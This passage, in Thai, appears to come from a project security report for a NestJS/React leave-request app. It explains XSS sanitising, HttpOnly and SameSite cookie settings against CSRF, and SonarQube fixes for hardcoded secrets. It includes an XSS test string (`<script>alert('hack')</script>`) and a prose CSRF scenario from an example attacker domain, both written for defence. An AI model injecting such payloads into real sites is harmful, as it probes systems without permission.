  - *อธิบายเสริม (กรณีเลี่ยงไม่ได้ ต้องใช้ HTML เพียว):* ถ้ามีเคสที่ระบบ "บังคับ" ว่าต้องรองรับการพิมพ์ HTML (เช่น ระบบมี Text Editor สไตล์ Word/TinyMCE) React จะบังคับให้เราใช้คำสั่งสุดอันตรายชื่อ `dangerouslySetInnerHTML` ซึ่งในกรณีนี้เรา **ห้ามโยนค่าใส่ตรงๆ** แต่ต้องเอาข้อมูลนั้นไปล้างทำความสะอาดผ่าน Library อย่าง **DOMPurify** หรือ **sanitize-html** ก่อนทุกครั้ง (เช่น `sanitize(dirtyHtml)`) เพื่อให้ Library ดูดกลืนแท็ก `<script>` อันตรายทิ้งไป เหลือแต่แท็กปลอดภัยอย่าง `<b>` หรือ `<i>` เท่านั้น
  - *อธิบายเชิงลึกชั้น HttpOnly (Plan B ป้องกันความเสียหาย):* ด่านสุดท้าย หากทะลุ Sanitize เข้ามาได้ Auth Cookie ของเราก็จะรอดตาย 100% เพราะ XSS Payload มาร้ายแค่ไหนก็เรียกคำสั่งขโมย Object `document.cookie` ดึง Token ไปไม่ได้
- **2.4 การทดสอบ:** ลองแทรก Request เหตุผลการลางานพิมพ์ว่า `<script>alert('hack')</script>` บนจอจะโชว์ประโยคนั้นเพียวๆ ไม่ตีเด้ง Pop-up 

### E3. Bonus: CSRF (Cross-Site Request Forgery)
- **3.1 เกิดเมื่อไหร่:** แฮกเกอร์มักฉกฉวยโอกาสช่วงที่เหยื่อยเปิดแท็บเซิฟเวอร์บริษัททิ้งคู่ไว้ (ทำให้มี Auth Cookie อยู่) พอเหยื่อหลงกดแท็บเว็บปลอมของแฮกเกอร์ ตัวเว็บปลอมแอบ Submit POST Request มุ่งหน้าไปหาปลายทางหลังบ้านของบริษัทเรา ซึ่งลูกข่ายเบราว์เซอร์ดันซื่อตรง แปะเปะ Cookie ยืนยันตัวตนแนบไปให้แฮกเกอร์ทำรายการเสร็จสับ
- **3.2 การป้องกัน:** **[มี]**
  - *อธิบายเชิงลึก (วิธีทำงานของ SameSite=Lax):* CSRF อาศัยพฤติกรรมพื้นฐานของเบราว์เซอร์ยุคเก่าที่จะ "แนบ Cookie ของผู้ใช้ไปด้วยเสมอ" ไม่ว่าคำสั่งยิง Request นั้นจะมาจากโดเมน (Origin) ไหน การตั้งค่าออปชันเสริม `SameSite='lax'` ในเซ็ตของ Cookie เปรียบเสมือนการสั่งยามเฝ้าประตูเบราว์เซอร์บนเครื่องฝั่ง Client ให้ปฏิบัติตามกฎเหล็ก 2 ข้อ:
    1. **บล็อก Cross-Site State-Changing Requests (POST/PUT/DELETE/PATCH):** หากผู้ใช้เผลอเปิดหน้าเว็บโดเมนของแฮกเกอร์ (เช่น `evil.com`) แล้วโดนโค้ดซ่อนรูปบังคับยิง `POST` Request (ไม่ว่าจะเป็น HTML Form Submit หรือแอบยิงผ่าน `AJAX`/`fetch`) มุ่งหน้ามาที่ API ควบคุมระบบของเรา (เช่น `ourproject.com/leaves/delete`) เบราว์เซอร์จะตรวจสอบทันทีว่าโดเมนต้นทางกับปลายทางไม่แมตช์กัน มันจึง **ริบ (Drop) Auth Cookie นั้นทิ้งไปกลางอากาศ** ไม่ยอมแนบส่งข้ามโดเมนไปให้ด้วย ผลคือระบบ Backend ตัว NestJS ของเราจะมองว่า Request สั่งลบข้อมูลนี้ "ไม่มีตั๋วยืนยันตัวตน" และปัดตกตีกลับเป็น HTTP `401 Unauthorized` ในเสี้ยววินาที มิจฉาชีพก็ทำอะไรข้อมูลไม่ได้
    2. **อนุโลมเฉพาะ Top-Level Navigation ที่ปลอดภัย (Safe HTTP GET Methods):** คำว่า 'Lax' แปลว่า "ผ่อนปรน" มันถูกวิจัยมาเพื่อสร้างสมดุล (Balance) ระหว่าง Security และ UX (User Experience) เบราว์เซอร์จะยังยอมให้แพ็ก Cookie ติดตัวมาด้วย **เฉพาะกรณีที่เป็นการคลิกลิงก์นำทางธรรมดาที่เป็นแบบ GET เท่านั้น** (เช่น เลื่อนอ่านอีเมลแล้วคลิกลิงก์ตรงมาเปิดหน้า Dashboard โปรเจกต์ของเรา) ซึ่งพฤติกรรมนี้ปลอดภัยเพราะการ GET โดยสากลจะไม่เปลี่ยนสถานะหรือแก้ไขข้อมูลในฐานข้อมูล และดีกว่าการไปจำกัดแบบ `'strict'` ที่บล็อกทุกลิงก์ข้ามเว็บจนเหยื่อต้องมานั่งล็อกอินใหม่พร่ำเพรื่อจนน่ารำคาญ
  - *เช็คได้ที่:* `backend/src/auth/auth.controller.ts` ฝั่งกระบวนการ `res.cookie()`
  **ตัวอย่างฟังก์ชันตั้งค่า Cookie ป้องกัน CSRF:**
  ```typescript
  res.cookie('jwt', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax', // ไฮไลท์การตั้งค่าป้องกัน CSRF 
    maxAge: 15 * 60 * 1000,
    path: '/',
  });
  ```

---

## 📈 F. Code Quality & Security Analysis
ระบบนี้ถูกพ่วงเชือกสายเชื่อมต่อกับ `sonar-project.properties` เพื่อบังคับกระบวนการ CI/CD
- **F1. Before Report (ก่อนแก้ไข):** 
  - ระบบจะชี้ให้เห็น Report บนหน้าจอ Dashboard ที่ขึ้น Issue ตระหนักระดับ Bugs / Code Smells และหมวด Vulnerabilities ร้ายแรง (โชว์พรีวิวฐานจากครั้งแรกก่อน Clean-up)
- **F2. After Report (หลังแก้ไข):** 
  - กราฟ Quality Gate ระบุเป็น "Passed" (สีเขียว)
  - จำนวน Issue ถูกรีดลดลงอย่างจับต้องสัมผัสได้
- **F3. ตัวอย่าง Issue ที่พบและการอธิบายรับมือ:** 
  - *ยกเคส: "Security Hotspot - Hardcoded credentials"*
  - *สาเหตุปัญหา (Root Cause):* SonarQube จับคู่ Pattern ของ String เสนอว่ามีคนเขียนระบุ Password หรือ JWT_SECRET แบบ Text มักง่ายคาไว้ใน `auth.module.ts` ในสมัยตั้งไข่
  - *การแก้ไข (Resolution):* ตัวผู้พัฒนา Refactor ตัดทิ้งและดันพารามิเตอร์ลับผ่านกลยุทธ์ Environment Variables โหลดกระสุนเข้า ConfigService ภายใต้ .env ชั่วคราว ซึ่งรหัสจะไม่แปดเปื้อนติดบน Git ตามกฎ `.gitignore` ความเสี่ยงการถูกเจาะ Repository จึงบารมีเต็มร้อย และปิดเคสนี้ให้ SonarQube 
  **โครงสร้าง Environment Variables (ConfigModule):**
  ```typescript
  import { Module } from '@nestjs/common';
  import { ConfigModule } from '@nestjs/config';

  @Module({
    imports: [
      ConfigModule.forRoot({
        isGlobal: true,      // เข้าถึงได้ทุกที่
        envFilePath: '.env', // ดึงค่าจากไฟล์ .env
      }),
      // ...โมดูลอื่น ๆ
    ],
  })
  export class AppModule {}
  ``` 
